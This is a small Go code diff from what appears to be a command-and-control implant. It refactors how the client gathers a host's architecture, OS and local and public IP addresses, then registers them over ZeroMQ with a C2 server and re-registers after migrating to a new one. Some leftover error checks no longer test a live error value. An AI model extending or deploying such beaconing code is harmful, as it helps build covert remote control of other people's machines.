@@ -159,9 +159,8 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 					log.Fatalln(err)
 				}
 
-				arch, OS, pubip := system.GETSYSTEM()
+				arch, OS, pubip, localip := system.GETSYSTEM()
 
-				localip, err := system.GETIPDNS()
 				if err != nil {
 					log.Fatalln(err)
 				}
@@ -172,7 +171,7 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)
 
 				res, err := ndealer.RecvMessage(0)
-				fmt.Println(res)
+
 				if res[0] == "terylene" {
 					go dealerhandle(ndealer, dealdown, migsignal, res[2])
 				} else {
@@ -212,9 +211,8 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				log.Println("reregisteration initiating")
 
 				err = ndealer.Connect(fmt.Sprintf("tcp://%s:%s", C2info.postC2info.C2ip, C2info.postC2info.rport))
-				arch, OS, pubip := system.GETSYSTEM()
+				arch, OS, pubip, localip := system.GETSYSTEM()
 
-				localip, err := system.GETIPDNS()
 				if err != nil {
 					log.Fatalln(err)
 				}
@@ -225,7 +223,6 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)
 
 				res, err := ndealer.RecvMessage(0)
-				fmt.Println(res)
 
 				if res[0] == "terylene" {
 					go dealerhandle(ndealer, dealdown, migsignal, res[2])
@@ -256,12 +253,11 @@ func register(zmqins zmqinstance, postinfo postC2info, timeout time.Duration) er
 	migsignal := make(chan postC2info)
 	submigsignal := make(chan struct{})
 
-	localip, err := system.GETIPDNS()
 	if err != nil {
 		log.Fatalln(err)
 	}
 
-	arch, OS, pubip := system.GETSYSTEM()
+	arch, OS, pubip, localip := system.GETSYSTEM()
 
 	log.Println("generating Conn ID")
 	connId := system.GenerateConnID(localip, pubip)
